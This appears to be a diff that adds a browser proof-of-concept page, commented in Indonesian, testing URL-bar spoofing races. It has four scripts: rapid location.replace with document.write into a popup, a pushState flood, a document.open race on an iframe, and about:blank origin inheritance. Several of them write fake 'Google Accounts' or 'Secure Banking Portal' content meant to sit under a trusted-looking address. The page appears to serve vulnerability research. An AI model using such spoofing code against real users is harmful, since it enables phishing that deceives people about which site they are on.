@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Navigation Race PoC</title>
+</head>
+<body>
+<h2>Bug 1: Deferred NavigationStateChanged Race</h2>
+<p>Tap tombol di bawah. Perhatikan URL bar — apakah ada momen
+dimana URL bar menampilkan URL LAMA sementara konten sudah berubah?</p>
+
+<button onclick="test1()" style="padding:15px 30px;font-size:18px;">
+  Test 1: Rapid location.replace
+</button><br><br>
+
+<button onclick="test2()" style="padding:15px 30px;font-size:18px;">
+  Test 2: Fragment + pushState flood
+</button><br><br>
+
+<button onclick="test3()" style="padding:15px 30px;font-size:18px;">
+  Test 3: document.open race
+</button><br><br>
+
+<button onclick="test4()" style="padding:15px 30px;font-size:18px;">
+  Test 4: about:blank intermediate
+</button>
+
+<div id="log" style="margin-top:20px;font-family:monospace;font-size:12px;"></div>
+
+<script>
+function log(msg) {
+  document.getElementById('log').innerHTML += msg + '<br>';
+}
+
+// Test 1: Cepat-cepat ganti location untuk race dengan deferred update
+function test1() {
+  // Flood NavigationStateChanged dengan banyak navigasi cepat
+  var w = window.open('', '_blank');
+  if (!w) { log('Popup blocked - tap sekali lagi'); return; }
+  
+  w.document.write('<h1>Loading bank page...</h1>');
+  
+  // Rapid-fire navigasi untuk confuse deferred state
+  setTimeout(() => {
+    w.location.replace('https://www.google.com');
+  }, 50);
+  
+  setTimeout(() => {
+    try {
+      // Coba tulis konten saat URL bar masih updating
+      w.document.open();
+      w.document.write(`
+        <h1>FAKE: accounts.google.com</h1>
+        <p>Jika URL bar menampilkan google.com tapi ini konten kita = BUG</p>
+        <p>Real URL: ${w.location.href}</p>
+      `);
+      w.document.close();
+    } catch(e) {
+      log('Blocked (expected for cross-origin): ' + e.message);
+    }
+  }, 100);
+}
+
+// Test 2: Flood pushState untuk overwhelm deferred handler
+function test2() {
+  log('Flooding pushState...');
+  var count = 0;
+  var interval = setInterval(() => {
+    try {
+      history.pushState({}, '', '/secure-page-' + count);
+      count++;
+      if (count > 100) {
+        clearInterval(interval);
+        // Setelah flood, cek apakah URL bar inconsistent
+        log('Flood done. URL bar: ' + location.href);
+        log('Cek: apakah URL bar tertinggal / menampilkan URL lama?');
+        document.title = 'Secure Banking Portal';
+      }
+    } catch(e) {
+      clearInterval(interval);
+      log('Error: ' + e.message);
+    }
+  }, 1);
+}
+
+// Test 3: document.open() race dengan navigasi
+function test3() {
+  var iframe = document.createElement('iframe');
+  iframe.style.width = '100%';
+  iframe.style.height = '400px';
+  iframe.style.border = '2px solid red';
+  document.body.appendChild(iframe);
+  
+  // Navigate iframe ke situs legit
+  iframe.src = 'https://example.com';
+  
+  // Race: coba tulis ke iframe sebelum navigasi commit
+  setTimeout(() => {
+    try {
+      iframe.contentDocument.open();
+      iframe.contentDocument.write(`
+        <h1>Fake Content Inside iframe</h1>
+        <p>Iframe URL seharusnya: example.com</p>
+        <p>Tapi konten ini dari attacker</p>
+      `);
+      iframe.contentDocument.close();
+      log('document.open succeeded! Cek iframe content vs URL');
+    } catch(e) {
+      log('document.open blocked: ' + e.message);
+    }
+  }, 10);
+}
+
+// Test 4: about:blank as intermediate navigation
+function test4() {
+  // about:blank mewarisi origin dari opener
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('Popup blocked'); return; }
+  
+  // Tulis konten phishing ke about:blank
+  w.document.write(`
+    <!DOCTYPE html>
+    <html>
+    <head><title>Google Accounts</title></head>
+    <body style="font-family:Arial;max-width:400px;margin:50px auto;">
+      <h2>about:blank origin inheritance test</h2>
+      <p>URL bar menampilkan: <strong>about:blank</strong></p>
+      <p>Origin yang diwarisi: <strong>${w.document.domain || 'none'}</strong></p>
+      <p>Opener origin: <strong>${location.origin}</strong></p>
+      <p style="color:red;">Jika about:blank TIDAK menampilkan 
+         URL/origin yang jelas = potensial spoofing vector</p>
+    </body>
+    </html>
+  `);
+  w.document.close();
+  
+  log('about:blank opened - cek URL bar di tab baru');
+}
+</script>
+</body>
+</html>
